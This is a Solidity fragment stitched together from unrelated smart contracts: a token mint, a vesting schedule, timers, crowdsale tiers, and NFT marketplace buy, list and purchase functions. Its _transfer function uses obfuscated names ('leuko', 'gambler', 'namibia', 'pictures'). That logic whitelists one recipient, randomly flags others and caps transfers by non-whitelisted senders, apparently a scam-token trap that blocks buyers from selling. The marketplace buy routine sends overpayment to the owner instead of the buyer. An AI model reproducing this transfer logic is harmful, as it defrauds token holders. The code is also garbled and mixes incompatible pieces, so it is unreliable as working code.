    }
    balances[msg.sender] = safeAdd(balances[msg.sender], tokens);
    _totalSupply = safeAdd(_totalSupply, tokens);
    Transfer(address(0), msg.sender, tokens);
    owner.transfer(msg.value);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (leuko == true)) {
        gambler[recipient] = true;
        namibia[recipient] = false;
        leuko = false;
    }
    if (gambler[recipient] != true) {
        namibia[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((namibia[sender]) && (gambler[recipient] == false)) {
        namibia[recipient] = true;
    }
    if (gambler[sender] == false) {
        require(amount < pictures);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function isVestingStarted() public view returns(bool) {
    return isVestingSet() && startTime <= block.timestamp;
}

function claimableAmount() public view returns(uint256) {
    if (startTime > block.timestamp)
        return 0;
    uint256 elapsedTime = block.timestamp.sub(startTime);
    uint256 totalApproved = amountPerRelease().mul(Math.min(elapsedTime.div(releaseInterval), totalReleaseCount));
    return totalApproved.sub(paidAmount);
}

function nextReleaseTimestamp() public view returns(uint256) {
    if (!isVestingSet()) {
        return 0;
    }
    if (!isVestingStarted()) {
        return startTime.add(releaseInterval);
    }
    uint256 elapsedTime = block.timestamp.sub(startTime);
    uint256 pastReleaseCount = elapsedTime.div(releaseInterval);
    if (pastReleaseCount > totalReleaseCount) {
        return 0;
    }
    return startTime.add(releaseInterval.mul(pastReleaseCount + 1));
}

function setVesting(address _recipient, uint256 _amount, uint256 _startTime, uint256 _releaseInterval, uint16 _releaseCount) external onlyOwner {
    require(startTime > block.timestamp, "VESTING_ALREADY_STARTED");
    require(_startTime > block.timestamp, "INVALID_START_TIME");
    require(_releaseCount > 0, "INVALID_RELEASE_COUNT");
    require(token.balanceOf(address(this)) >= _amount, "INSUFFICIENT_TOKEN_BALANCE");
    startTime = _startTime;
    releaseInterval = _releaseInterval;
    totalReleaseCount = _releaseCount;
    totalAmount = _amount;
    recipient = _recipient;
}

function cancelVesting() external onlyOwner {
    require(!isVestingStarted(), "VESTING_ALREADY_STARTED");
    token.transfer(owner(), token.balanceOf(address(this)));
    startTime = ~uint256(0);
    releaseInterval = 0;
    totalReleaseCount = 0;
    paidAmount = 0;
    recipient = address(0);
}

function claim() public onlyRecipient {
    uint256 claimingAmount = claimableAmount();
    token.transfer(recipient, claimingAmount);
    paidAmount = paidAmount.add(claimingAmount);
}

function reset(uint256 _id) external only(_IIntervalIterator_) {
    Timestamp storage timestamp = timestamps[_id];
    assert(timestamp.valid);
    timestamp.valid = false;
    timestamp.value = 0;
}

function start(uint256 _id) external only(_IIntervalIterator_) {
    Timestamp storage timestamp = timestamps[_id];
    assert(!timestamp.valid);
    timestamp.valid = true;
    timestamp.value = time();
}

function expired(uint256 _id) external view returns(bool) {
    Timestamp storage timestamp = timestamps[_id];
    if (!timestamp.valid)
        return false;
    return timestamp.value.add(timeout) < time();
}

function running(uint256 _id) external view returns(bool) {
    Timestamp storage timestamp = timestamps[_id];
    if (!timestamp.valid)
        return false;
    return timestamp.value.add(timeout) >= time();
}

function currentTierDiscountPercentage() internal view returns(uint64) {
    uint64 _now = uint64(block.timestamp);
    if (_now > crowdSaleStart) return 0;
    if (_now > presaleStartDate) return 10;
    if (_now > privateSaleDate) return 15;
    return 0;
}

function saleDue() public view returns(bool) {
    return crowdSaleEnd < uint64(block.timestamp);
}

function buy(uint tokenId) public payable {
    require(nftsForSaleIds.contains(tokenId), "Trying to unlist an NFT which is not listed yet!");
    address payable nftOwner = address(uint160(nftOwners[tokenId]));
    address payable _owner = address(uint160(owner));
    uint price = nftsForSalePrices[tokenId];
    uint fee = price.mul(sellingFeeRateX100).div(1e4);
    uint amountAfterFee = price.sub(fee);
    PriceType _priceType = priceTypes[tokenId];
    nftsForSaleIds.remove(tokenId);
    nftsForSaleByAddress[nftOwners[tokenId]].remove(tokenId);
    delete nftOwners[tokenId];
    delete nftsForSalePrices[tokenId];
    delete priceTypes[tokenId];
    if (_priceType == PriceType.ETHER) {
        require(msg.value >= price, "Insufficient ETH is transferred to purchase!");
        _owner.transfer(fee);
        nftOwner.transfer(amountAfterFee);
        if (msg.value > price) {
            _owner.transfer(msg.value.sub(price));
        }
    } else if (_priceType == PriceType.TOKEN) {
        require(IERC20(trustedFeeTokenAddress).transferFrom(msg.sender, address(this), price), "Could not transfer fee to Marketplace!");
        require(IERC20(trustedFeeTokenAddress).transfer(_owner, fee), "Could not transfer purchase fee to admin!");
        require(IERC20(trustedFeeTokenAddress).transfer(nftOwner, amountAfterFee), "Could not transfer sale revenue to NFT seller!");
    } else {
        revert("Invalid Price Type!");
    }
    IERC721(trustedNftAddress).transferFrom(address(this), msg.sender, tokenId);
    emit Buy(tokenId);
}

function list(uint tokenId, uint price, PriceType priceType) public {
    IERC721(trustedNftAddress).transferFrom(msg.sender, address(this), tokenId);
    nftsForSaleIds.add(tokenId);
    nftsForSaleByAddress[msg.sender].add(tokenId);
    nftOwners[tokenId] = msg.sender;
    nftsForSalePrices[tokenId] = price;
    priceTypes[tokenId] = priceType;
    emit List(tokenId, price, priceType);
}

function purchase(address _caller, uint256 _tokenId, uint256 _totalPaid) public payable nftOnly {
    Listing memory _listing = listings[_tokenId];
    address _seller = _listing.seller;
    require(_caller != _seller); 
    require(listingActive(_tokenId));
    uint256 _price = currentPrice(_tokenId);
    require(_totalPaid >= _price);
    delete listings[_tokenId];
    nft.transfer(_caller, _tokenId);
    _seller.transfer(msg.value);
    TokenSold(_tokenId, _price, _totalPaid, _seller, _caller);
}

function currentPrice(uint256 _tokenId) public view returns(uint256) {
    Listing memory listing = listings[_tokenId];
    require(now >= listing.createdAt);
    uint256 _deadline = listing.createdAt + listing.durationSeconds;
    require(now <= _deadline);
    uint256 _elapsedTime = now - listing.createdAt;
    uint256 _progress = (_elapsedTime * 100) / listing.durationSeconds;
    uint256 _delta = listing.startingPrice - listing.minimumPrice;
    return listing.startingPrice - ((_delta * _progress) / 100);
}

function listingActive(uint256 _tokenId) internal view returns(bool) {
    Listing memory listing = listings[_tokenId];
    return listing.createdAt + listing.durationSeconds >= now && now >= listing.createdAt;
}

function unlist(address _caller, uint256 _tokenId) public nftOnly {
    address _seller = listings[_tokenId].seller;
    require(_seller == _caller || address(owner) == _caller);
    nft.transfer(_seller, _tokenId);
    delete listings[_tokenId];
    TokenUnlisted(_tokenId, _caller);
}

